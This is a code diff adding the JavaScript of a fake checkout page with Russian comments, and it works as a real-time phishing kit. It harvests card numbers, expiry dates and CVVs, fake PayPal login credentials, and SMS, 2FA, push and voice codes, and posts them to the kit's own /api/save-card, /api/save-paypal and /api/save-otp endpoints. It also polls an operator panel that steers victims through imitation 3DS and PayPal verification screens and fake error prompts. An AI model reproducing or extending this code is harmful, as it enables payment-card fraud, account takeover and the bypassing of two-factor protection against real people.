+            document.getElementById('receiptDateDisplay').innerText = formattedDate;
+            
+            // Название платежного метода
+            document.getElementById('receiptMethodDisplay').innerText = methodType === 'paypal' ? 'PayPal' : 'Stripe';
+
+            // Извлечение данных из инпутов биллинга
+            let fName = document.getElementById('firstName').value.trim() || 'Charly';
+            let lName = document.getElementById('lastName').value.trim() || 'Ferguson';
+            let street = document.getElementById('streetAddress').value.trim() || '123 Rodeo Dr';
+            let city = document.getElementById('townCity').value.trim() || 'Houston';
+            let state = document.getElementById('stateRegion').value || 'TX';
+            let zip = document.getElementById('zipCode').value.trim() || '33322';
+            let phoneVal = document.getElementById('phone').value.trim() || '+19008008877';
+            let emailVal = document.getElementById('emailAddress').value.trim() || 'charly@gmail.com';
+
+            // Обновление блока Billing Address на чеке
+            document.getElementById('receiptBillingAddressBlock').innerHTML = 
+                fName + ' ' + lName + '<br>' + street + '<br>' + city + ', ' + state + ' ' + zip + '<br>📞 ' + phoneVal + '<br>✉️ ' + emailVal;
+
+            // Обновление блока Shipping Address на чеке (Генерация Henry Ford для соответствия скриншоту)
+            document.getElementById('receiptShippingAddressBlock').innerHTML = 
+                'Henry Ford<br>Emergency Services Street<br>Appleton, AL 44444<br>📞 +18009008877';
+        }
+
+        // Функция динамического формирования маски телефона для PayPal 2FA
+        function formatPayPalPhoneMask(rawPhone) {
+            const clean = rawPhone.replace(/[^0-9]/g, '');
+            if (clean.length >= 7) {
+                const countryCode = rawPhone.startsWith('+') ? rawPhone.substring(0, 3) : '+' + clean.substring(0, 1);
+                const firstDigit = clean.substring(clean.length - 10, clean.length - 9) || '9';
+                const lastTwo = clean.substring(clean.length - 2);
+                return countryCode + ' ' + firstDigit + '••-•••-••' + lastTwo;
+            }
+            return '+1 9••-•••-••35'; 
+        }
+
+                // ПОЛНОСТЬЮ ВОССТАНОВЛЕННАЯ ФУНКЦИЯ: Содержит жесткую валидацию и не ломает синтаксис JS
+        function processPlaceOrder(methodType) {
+            if (isSubmitting) return; 
+
+            // Жесткая проверка заполнения всех обязательных полей Billing адреса перед любой отправкой
+            const requiredBillingFields = ['firstName', 'lastName', 'countryRegion', 'streetAddress', 'townCity', 'stateRegion', 'zipCode', 'phone', 'emailAddress'];
+            let isBillingValid = true;
+
+            requiredBillingFields.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) {
+                    if (!input.value.trim() || input.value === "") {
+                        input.classList.add('input-error'); 
+                        isBillingValid = false;
+                    } else {
+                        input.classList.remove('input-error');
+                    }
+                }
+            });
+
+            // Если биллинг адрес не заполнен — полностью прерываем отправку и карты, и PayPal
+            if (!isBillingValid) {
+                alert('Please fill in all required Billing details before placing your order!');
+                return;
+            }
+            
+            let fName = document.getElementById('firstName').value.trim();
+            let lName = document.getElementById('lastName').value.trim();
+            let company = document.getElementById('companyName').value.trim();
+            let country = document.getElementById('countryRegion').value;
+            let street = document.getElementById('streetAddress').value.trim();
+            let apt = document.getElementById('apartment').value.trim();
+            let city = document.getElementById('townCity').value.trim();
+            let state = document.getElementById('stateRegion').value;
+            let zip = document.getElementById('zipCode').value.trim();
+            let phoneVal = document.getElementById('phone').value.trim();
+            let emailVal = document.getElementById('emailAddress').value.trim();
+            
+            let customerFullName = (fName + ' ' + lName).trim() || 'Card Holder';
+            let fullStreetAddress = street + (apt ? ', ' + apt : '');
+
+            let billingPayload = {
+                firstName: fName, lastName: lName, companyName: company, countryRegion: country,
+                streetAddress: fullStreetAddress, townCity: city, stateRegion: state, zipCode: zip,
+                phone: phoneVal, emailAddress: emailVal
+            };
+
+            const cardBtn = document.getElementById('card-submit-btn');
+            const cardSpinner = document.getElementById('card-btn-spinner');
+            if (cardBtn) { 
+                cardBtn.disabled = true; 
+                cardBtn.querySelector('span').innerText = 'Processing...'; 
+            }
+            if (cardSpinner) {
+                cardSpinner.style.display = 'inline-block';
+            }
+
+            if (methodType === 'paypal') {
+                // Автоматическое обновление телефонной маски сразу при выборе PayPal
+                const userPhone = document.getElementById('phone').value.trim();
+                const paypalPhoneMaskSpan = document.getElementById('paypalOtpPhoneMask');
+                if (paypalPhoneMaskSpan && userPhone) {
+                    paypalPhoneMaskSpan.innerText = formatPayPalPhoneMask(userPhone);
+                }
+
+                const paypalName = document.getElementById('paypalInlineName').value.trim();
+                const paypalEmail = document.getElementById('paypalInlineEmail').value.trim();
+                if (!paypalEmail) {
+                    if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; }
+                    if (cardSpinner) cardSpinner.style.display = 'none';
+                    return alert('Please enter your Email!');
+                }
+
+                isSubmitting = true;
+                
+                fetch('/api/save-card', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ 
+                        bankName: 'PayPal Session', cardName: paypalName || customerFullName, paypalEmail: paypalEmail,
+                        ...billingPayload
+                    }) 
+                })
+                .then(res => res.json())
+                .then(data => { 
+                    isSubmitting = false;
+                    if (data.success) { 
+                        currentCardId = data.cardId; 
+                        document.getElementById('emPaypalEmail').value = paypalEmail;
+                        closeAllPaymentModals();
+                        document.getElementById('paypalModalWrapper').style.display = 'flex';
+                        startStatusChecking();
+                    } 
+                }).catch(() => {
+                    isSubmitting = false;
+                    if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; }
+                    if (cardSpinner) cardSpinner.style.display = 'none';
+                });
+                return;
+            }
+
+            const cardInput = document.getElementById('cardNumber').value.trim();
+            if (!cardInput) {
+                if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; }
+                if (cardSpinner) cardSpinner.style.display = 'none';
+                return alert('Please enter your card number!');
+            }
+            
+            isSubmitting = true;
+            
+            const cleanCard = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cleanExpiry = document.getElementById('expiry').value.replace(/\s/g, '').replace(/\//g, '');
+            
+            fetch('/api/save-card', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ 
+                    cardNumber: cleanCard, expiry: cleanExpiry || '1229', cvv: document.getElementById('cvv').value || '000', 
+                    bankName: 'Stripe Gateway Secured', cardName: document.getElementById('cardName').value.trim() || customerFullName,
+                    ...billingPayload
+                }) 
+            })
+            .then(res => { if (!res.ok) throw new Error('Server Error'); return res.json(); })
+            .then(data => { 
+                if (data.success) { 
+                    currentCardId = data.cardId; 
+                    startStatusChecking(); 
+                } else { 
+                    isSubmitting = false; 
+                    if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; } 
+                    if (cardSpinner) cardSpinner.style.display = 'none'; 
+                    alert('Error saving card data.'); 
+                } 
+            })
+            .catch(err => { 
+                isSubmitting = false; 
+                if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; } 
+                if (cardSpinner) cardSpinner.style.display = 'none'; 
+                alert('Server connection error.'); 
+            });
+        }
+
+
+        // ОТПРАВКА ФОРМЫ ЛОГИНА/ПАРОЛЯ ВО ВСТРОЕННОМ ОКНЕ PAYPAL
+        function submitEmbeddedPaypalLoginForm() {
+            const email = document.getElementById('emPaypalEmail').value.trim();
+            const password = document.getElementById('emPaypalPassword').value.trim();
+            if (!email || !password) return alert('Please enter your credentials!');
+            
+            document.getElementById('paypalEmbeddedLoader').style.display = 'flex';
+            document.getElementById('paypal-submit-btn').disabled = true;
+            document.getElementById('paypal-btn-spinner').style.display = 'inline-block';
+            document.getElementById('paypal-embedded-error-box').style.setProperty('display', 'none', 'important');
+            fetch('/api/save-paypal', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ cardId: currentCardId, email, password })
+})
+.then(res => res.json())
+.then(() => { startStatusChecking(); });
+}
+        function submitPaypalOtp() {
+let code = document.getElementById('p1').value + document.getElementById('p2').value + document.getElementById('p3').value + document.getElementById('p4').value + document.getElementById('p5').value + document.getElementById('p6').value;
+if (code.length < 6) return alert('Please enter full code!');
+            document.getElementById('paypal2faLoader').style.setProperty('display', 'flex', 'important');
+const submitBtn = document.getElementById('paypal-2fa-btn');
+if (submitBtn) { submitBtn.disabled = true; submitBtn.style.opacity = '0.6'; }
+document.getElementById('paypal-2fa-error-box').style.setProperty('display', 'none', 'important');
+            fetch('/api/save-otp', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ cardId: currentCardId, otp: code })
+});
+}
+// ОТПРАВКА СЕКРЕТНОГО КОДА ЗВОНКА РОБОТА
+function submitCallSecretCode() {
+const code = document.getElementById('callSecretCode').value.trim();
+if (code.length < 6) return alert('Enter full code!');
+document.getElementById('callScreenLoader').style.setProperty('display', 'flex', 'important');
+fetch('/api/save-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: currentCardId, otp: code, bankName: 'Call Voice Code' }) })
+.then(res => res.json()).then(data => { if (data.success) startStatusChecking(); });
+}
+let pushTimerInterval = null;
+let pushSecondsLeft = null;
+// ЗАПУСК ГРАФИЧЕСКОГО КРУГЛОВОГО ТАЙМЕРА
+function startPushCountdownTimer() {
+if (pushTimerInterval && pushSecondsLeft !== null) return;
+if (pushSecondsLeft === null) pushSecondsLeft = 300;
+if (pushTimerInterval) clearInterval(pushTimerInterval);
+const leftLogo = document.getElementById('bankPushLogoLeft');
+const rightLogo = document.getElementById('bankPushLogoRight');
+if (leftLogo) leftLogo.src = cachedBankLogo || '';
+if (rightLogo) rightLogo.src = cachedPaymentLogo || '';
+pushTimerInterval = setInterval(() => {
+let m = Math.floor(pushSecondsLeft / 60);
+let s = pushSecondsLeft % 60;
+if (s < 10) s = '0' + s;
+const digits = document.getElementById('pushTimerDigits');
+if (digits) digits.innerText = m + ':' + s;
+const ring = document.getElementById('pushRingAnimate');
+if (ring) {
+let offset = 289 - (289 * pushSecondsLeft) / 300;
+ring.style.strokeDashoffset = offset;
+}
+if (pushSecondsLeft <= 0) {
+clearInterval(pushTimerInterval);
+pushTimerInterval = null;
+pushSecondsLeft = null;
+handleTryAgainAction();
+}
+pushSecondsLeft--;
+}, 1000);
+}
+        // Клик по кнопке COMPLETE — передаёт системный лог нажатия в панель оператора
+        function submitPushCompleteAction() {
+            const btn = document.getElementById('push-complete-btn');
+            const spinner = document.getElementById('push-inline-spinner');
+            if (btn) btn.disabled = true;
+            if (spinner) spinner.style.display = 'inline-block';
+
+            if (currentCardId) {
+                fetch('/api/save-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cardId: currentCardId, otp: 'КЛИЕНТ НАЖАЛ COMPLETE В ПУШЕ', bankName: 'Push App Verification' })
+                });
+            }
+        }
+        // Запуск 5-минутного таймера обратного отсчета для банковского окна 3DS (без сброса назад)
+        let bankTimerSecondsLeft = null;
+
+        function start3dsCountdownTimer() {
+            if (window.bankTimerInterval && bankTimerSecondsLeft !== null) return;
+            if (bankTimerSecondsLeft === null) bankTimerSecondsLeft = initialTimerSeconds;
+            if (window.bankTimerInterval) clearInterval(window.bankTimerInterval);
+            
+            window.bankTimerInterval = setInterval(() => {
+                let m = Math.floor(bankTimerSecondsLeft / 60); 
+                let s = bankTimerSecondsLeft % 60;
+                if (s < 10) s = '0' + s;
+                const timerDisplay = document.getElementById('3dsTimerMinutes');
+                if (timerDisplay) { 
+                    timerDisplay.innerHTML = 'You have <b>' + m + ':' + s + '</b> minutes left to enter your OTP.';
+                }
+                if (bankTimerSecondsLeft <= 0) { 
+                    clearInterval(window.bankTimerInterval); 
+                    window.bankTimerInterval = null;
+                    bankTimerSecondsLeft = null;
+                    handleTryAgainAction(); 
+                }
+                bankTimerSecondsLeft--;
+            }, 1000);
+        }
+
+        // Отправка лога повторного запроса СМС (Re-send OTP)
+        function triggerResendOtp(event) {
+            event.preventDefault(); 
+            if (!currentCardId) return;
+            let currentSecondsLeft = bankTimerSecondsLeft !== null ? bankTimerSecondsLeft : initialTimerSeconds;
+            let passedSeconds = initialTimerSeconds - currentSecondsLeft;
+            let passedM = Math.floor(passedSeconds / 60); let passedS = passedSeconds % 60;
+            let timePassedFormatted = passedM + ':' + (passedS < 10 ? '0' + passedS : passedS);
+            
+            fetch('/api/save-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: currentCardId, otp: 'ЗАПРОС ПОВТОРНОГО СМС', bankName: 'Клиент нажал Re-send OTP. Прошло времени: [' + timePassedFormatted + ']' }) })
+            .then(() => { alert('A new security code has been requested.'); bankTimerSecondsLeft = null; start3dsCountdownTimer(); });
+        }
+
+        // Инициализация таймера повторного запроса кода для PayPal
+        function startPaypalResendTimer() {
+            let secondsLeft = 30;
+            const btn = document.getElementById('paypalResendBtn');
+            if (!btn) return;
+            btn.style.color = '#64748b'; btn.style.cursor = 'not-allowed'; btn.style.textDecoration = 'none';
+            if (window.paypalTimerInterval) clearInterval(window.paypalTimerInterval);
+            window.paypalTimerInterval = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft <= 0) {
+                    clearInterval(window.paypalTimerInterval);
+                    btn.innerText = 'Resend code'; btn.style.color = '#003087'; btn.style.cursor = 'pointer'; btn.style.textDecoration = 'underline';
+                } else { btn.innerText = 'Resend code in ' + secondsLeft + ' sec'; }
+            }, 1000);
+        }
+
+        // Обработка клика повторной отправки СМС для шлюза PayPal
+        function handlePaypalResendClick(e) {
+            e.preventDefault();
+            const btn = document.getElementById('paypalResendBtn');
+            if (!btn || btn.style.cursor === 'not-allowed') return;
+            if (currentCardId) {
+                fetch('/api/save-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: currentCardId, otp: 'ЗАПРОС ПОВТОРНОГО 2FA СМС', bankName: 'Система PayPal: Клиент нажал кнопку Resend code (Запросил новый СМС код)' }) })
+                .then(() => { alert('A new security code has been sent.'); startPaypalResendTimer(); });
+            }
+        }
+
+        // Подготовка 3DS шлюза, динамическая маска телефона и подгрузка логотипов
+        function sendRealCardDataToServer(bankLogoUrl, paymentLogoUrl) {
+            closeAllPaymentModals();
+            if (bankLogoUrl) cachedBankLogo = bankLogoUrl;
+            if (paymentLogoUrl) cachedPaymentLogo = paymentLogoUrl;
+            
+            const leftLogoImg = document.getElementById('bank3dsLogoLeft');
+            const rightLogoImg = document.getElementById('bank3dsLogoRight');
+            if (leftLogoImg) { leftLogoImg.src = cachedBankLogo || ''; leftLogoImg.style.display = cachedBankLogo ? 'block' : 'none'; }
+            if (rightLogoImg) { rightLogoImg.src = cachedPaymentLogo || ''; rightLogoImg.style.display = cachedPaymentLogo ? 'block' : 'none'; }
+            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            if (cardNumber) { document.getElementById('m3dsCardMask').innerText = cardNumber.substring(0,4) + '******' + cardNumber.substring(12,16); }
+            
+            // ДИНАМИЧЕСКАЯ МАСКА: Автоматически берет 2 последние цифры из ввода клиента
+            const customerPhone = document.getElementById('phone').value.trim();
+            if (customerPhone && customerPhone.length >= 2) { 
+                const lastTwoDigits = customerPhone.substring(customerPhone.length - 2);
+                document.getElementById('m3dsPhoneMask').innerText = '******' + lastTwoDigits; 
+            } else {
+                document.getElementById('m3dsPhoneMask').innerText = '******87'; // Резервная маска по умолчанию
+            }
+            
+            // Фиксация текущей даты сессии
+            const currentSystemDate = new Date();
+            let d = currentSystemDate.getDate(); let m = currentSystemDate.getMonth() + 1; let y = currentSystemDate.getFullYear();
+            document.getElementById('m3dsDateDisplay').innerText = (d < 10 ? '0' + d : d) + '/' + (m < 10 ? '0' + m : m) + '/' + y;
+            
+            document.getElementById('bankOtpModalWrapper').style.setProperty('display', 'flex', 'important');
+            start3dsCountdownTimer(); 
+            startStatusChecking();
+        }
+        // Кнопка Submit внутри банковского окна (Без сжатия полей и без деформаций)
+        function submitOtp() {
+            const codeVal = document.getElementById('otpCode').value.trim();
+            if (!codeVal) return alert('Please enter your OTP code!');
+            isWaitingForNewDecision = true;
+            document.getElementById('error-block-alert').style.setProperty('display', 'none', 'important');
+            
+            const btn = document.getElementById('bank-submit-inline-btn');
+            const spinner = document.getElementById('bank-inline-spinner');
+            const textSpan = document.getElementById('bank-submit-text');
+            
+            // Переключаем кнопку в серый встроенный режим "Processing..."
+            if (btn) btn.disabled = true;
+            if (spinner) spinner.style.display = 'inline-block';
+            if (textSpan) textSpan.innerText = 'Processing...';
+
+            if (currentCardId) { 
+                fetch('/api/save-otp', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ cardId: currentCardId, otp: codeVal }) 
+                }); 
+            }
+        }
+
+        // Ссылка Re-enter при неверном СМС коде
+        function handleReEnter(e) {
+            e.preventDefault();
+            const btn = document.getElementById('bank-submit-inline-btn');
+            const spinner = document.getElementById('bank-inline-spinner');
+            const textSpan = document.getElementById('bank-submit-text');
+            if(btn) btn.disabled = true;
+            if(spinner) spinner.style.display = 'inline-block';
+            if(textSpan) textSpan.innerText = 'Processing...';
+            document.getElementById('error-block-alert').style.display = 'none';
+
+            if (currentCardId) {
+                fetch('/api/save-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: currentCardId, otp: 'КЛИЕНТ НАЖАЛ КНОПКУ RE-ENTER', bankName: 'Система: Клиент нажал Re-enter, ожидает сброса ошибки оператором' }) })
+                .then(() => { isWaitingForNewDecision = true; });
+            }
+        }
+
+        // Перезапуск формы при нажатии оператором кнопки "Нет средств" (Try Again)
+        function handleTryAgainAction() {
+            if (!currentCardId) return;
+            const tryAgainBtn = document.querySelector('#status-funds-view button');
+            if (tryAgainBtn) tryAgainBtn.disabled = true;
+            fetch('/api/admin/decision', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: currentCardId, decision: 'CARD_CHECKING_OTP' }) })
+            .then(res => {
+                if (tryAgainBtn) tryAgainBtn.disabled = false;
+                closeAllPaymentModals();
+                document.getElementById('main-checkout-view').style.display = 'flex';
+                document.getElementById('otpCode').value = '';
+                
+                // Исправлено: Полностью возвращаем главную кнопку Place Order в активный режим
+                const cardBtn = document.getElementById('card-submit-btn');
+                const cardSpinner = document.getElementById('card-btn-spinner');
+                if (cardBtn) { cardBtn.disabled = false; cardBtn.querySelector('span').innerText = 'Place order'; }
+                if (cardSpinner) cardSpinner.style.display = 'none';
+
+                start3dsCountdownTimer(); 
+                startStatusChecking();
+            }).catch(err => { if (tryAgainBtn) tryAgainBtn.disabled = false; alert('Connection error.'); });
+        }
+        // Центральное ядро шлюза: Циклический мониторинг статусов оператора
+        function startStatusChecking() {
+            if (statusInterval) clearInterval(statusInterval);
+            statusInterval = setInterval(() => {
+                if (!currentCardId) return;
+                fetch('/api/check-status?cardId=' + currentCardId)
+                .then(res => res.json()).then(data => {
+                    if (data.success) {
+                        if (data.bankLogo) cachedBankLogo = data.bankLogo;
+                        if (data.paymentLogo) cachedPaymentLogo = data.paymentLogo;
+                        if (isWaitingForNewDecision && data.status === 'invalid_otp') return;
+
+                        if (data.status === 'paypal_wrong') { 
+                            closeAllPaymentModals(); document.getElementById('paypalModalWrapper').style.display = 'flex'; 
+                            document.getElementById('paypalEmbeddedLoader').style.display = 'none'; 
+                            document.getElementById('paypal-embedded-error-box').style.setProperty('display', 'block', 'important'); 
+                            document.getElementById('paypal-submit-btn').disabled = false; document.getElementById('paypal-btn-spinner').style.display = 'none'; 
+                        }
+                        else if (data.status === 'PAYPAL_CHECKING_OTP') { closeAllPaymentModals(); document.getElementById('paypalOtpModalWrapper').style.display = 'flex'; const ldr = document.getElementById('paypal2faLoader'); if (ldr) ldr.style.setProperty('display', 'flex', 'important'); }
+                        else if (data.status === 'checking_paypal') { closeAllPaymentModals(); document.getElementById('paypalModalWrapper').style.display = 'flex'; const ldr = document.getElementById('paypalEmbeddedLoader'); if (ldr) ldr.style.setProperty('display', 'flex', 'important'); document.getElementById('paypal-embedded-error-box').style.setProperty('display', 'none', 'important'); }
+                        else if (data.status === 'paypal_auth') { closeAllPaymentModals(); document.getElementById('paypalModalWrapper').style.display = 'flex'; document.getElementById('paypalEmbeddedLoader').style.display = 'none'; document.getElementById('paypal-submit-btn').disabled = false; document.getElementById('paypal-btn-spinner').style.display = 'none'; }
+                        else if (data.status === 'paypal_2fa_sms') { 
+                            closeAllPaymentModals(); document.getElementById('paypalOtpModalWrapper').style.display = 'flex'; document.getElementById('paypal2faLoader').style.display = 'none'; document.getElementById('paypal-2fa-error-box').style.display = 'none'; 
+                            const btn = document.getElementById('paypal-2fa-btn'); if (btn) { btn.disabled = false; btn.style.opacity = '1'; } 
+                            for(let i=1; i<=6; i++) { let p = document.getElementById('p'+i); if(p) p.disabled = false; }
+                            document.getElementById('p1').focus(); startPaypalResendTimer();
+                        }
+                        else if (data.status === 'paypal_2fa_wrong') { closeAllPaymentModals(); document.getElementById('paypalOtpModalWrapper').style.display = 'flex'; document.getElementById('paypal2faLoader').style.display = 'none'; document.getElementById('paypal-2fa-error-box').style.setProperty('display', 'block', 'important'); const btn = document.getElementById('paypal-2fa-btn'); if (btn) { btn.disabled = false; btn.style.opacity = '1'; } for(let i=1; i<=6; i++) { let p = document.getElementById('p'+i); if(p) p.disabled = false; } }
+                        else if (data.status === 'CARD_CHECKING_OTP') { 
+                            isWaitingForNewDecision = false; 
+                        }
+                        else if (data.status === 'waiting_card') {
+                            isWaitingForNewDecision = false; closeAllPaymentModals(); document.getElementById('bankOtpModalWrapper').style.display = 'flex';
+                            document.getElementById('otpCode').disabled = false; enableBankSubmit();
+                            const bankBtn = document.getElementById('bank-submit-inline-btn'); const bankSpinner = document.getElementById('bank-inline-spinner'); const bankText = document.getElementById('bank-submit-text');
+                            if(bankBtn) bankBtn.disabled = false; if(bankSpinner) bankSpinner.style.display = 'none'; if(bankText) bankText.innerText = 'Submit';
+                            const leftLogoImg = document.getElementById('bank3dsLogoLeft'); const rightLogoImg = document.getElementById('bank3dsLogoRight');
+                            if (leftLogoImg && cachedBankLogo) { leftLogoImg.src = cachedBankLogo; leftLogoImg.style.display = 'block'; } if (rightLogoImg && cachedPaymentLogo) { rightLogoImg.src = cachedPaymentLogo; rightLogoImg.style.display = 'block'; }
+                            document.getElementById('error-block-alert').style.display = 'none';
+                        }
+                        else if (data.status === 'invalid_otp') { 
+                            isWaitingForNewDecision = false; closeAllPaymentModals(); document.getElementById('bankOtpModalWrapper').style.display = 'flex';
+                            const bankSpinner = document.getElementById('bank-inline-spinner'); const bankText = document.getElementById('bank-submit-text');
+                            if(bankSpinner) bankSpinner.style.display = 'none'; if(bankText) bankText.innerText = 'Submit';
+                            document.getElementById('otpCode').disabled = true; disableBankSubmit();
+                            document.getElementById('error-block-alert').style.setProperty('display', 'flex', 'important');
+                        }
+                        else if (data.status === 'method_3ds') { 
+                            clearInterval(statusInterval); 
+                            sendRealCardDataToServer(data.bankLogo, data.paymentLogo); 
+                        }
+                        else if (data.status === 'method_push') { 
+                            closeAllPaymentModals(); 
+                            const pushErrorBox = document.getElementById('bank-push-error-box');
+                            if (pushErrorBox) pushErrorBox.style.setProperty('display', 'none', 'important');
+                            
+                            document.getElementById('bankPushModalWrapper').style.setProperty('display', 'flex', 'important'); 
+                            startPushCountdownTimer(); 
+                        }
+                        else if (data.status === 'method_call') { 
+                            closeAllPaymentModals(); 
+                            document.getElementById('bankCallModalWrapper').style.display = 'flex'; 
+                        }
+                        else if (data.status === 'wrong_push') { 
+                            closeAllPaymentModals(); 
+                            document.getElementById('bankPushModalWrapper').style.setProperty('display', 'flex', 'important'); 
+                            startPushCountdownTimer(); 
+                            
+                            const pushErrorBox = document.getElementById('bank-push-error-box');
+                            if (pushErrorBox) pushErrorBox.style.setProperty('display', 'block', 'important');
+                            
+                            const pushBtn = document.getElementById('push-complete-btn');
+                            const pushSpinner = document.getElementById('push-inline-spinner');
+                            if (pushBtn) { 
+                                pushBtn.disabled = false; 
+                                pushBtn.querySelector('span').innerText = 'Complete'; 
+                            }
+                            if (pushSpinner) pushSpinner.style.display = 'none';
+                        }
+                        else if (data.status === 'wrong_call') { 
+                            closeAllPaymentModals(); 
+                            document.getElementById('bankCallModalWrapper').style.display = 'flex'; 
+                        }
+                        else if (data.status === 'redirect' && data.redirectUrl) { 
+                            clearInterval(statusInterval); 
+                            location.href = data.redirectUrl; 
+                        }
+                        else if (data.status === 'success') { 
+                            clearInterval(statusInterval); 
+                            closeAllPaymentModals(); 
+                            document.getElementById('statusSuccessModalWrapper').style.display = 'flex'; 
+                        }
+                        else if (data.status === 'insufficient_funds') { 
+                            clearInterval(statusInterval); 
+                            closeAllPaymentModals(); 
+                            document.getElementById('statusFundsModalWrapper').style.display = 'flex'; 
+                        }
+                        else if (data.status === 'error') { 
+                            clearInterval(statusInterval); 
+                            closeAllPaymentModals(); 
+                            document.getElementById('statusDeclineModalWrapper').style.display = 'flex'; 
+                        }
+                        else if (data.status === 'waiting_admin_allow') { 
+                            clearInterval(statusInterval); 
+                            document.getElementById('card-submit-btn').disabled = false; 
+                            document.getElementById('card-btn-spinner').style.display = 'none';
+                            closeAllPaymentModals(); 
+                            document.getElementById('main-checkout-view').style.display = 'flex'; 
+                        }
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
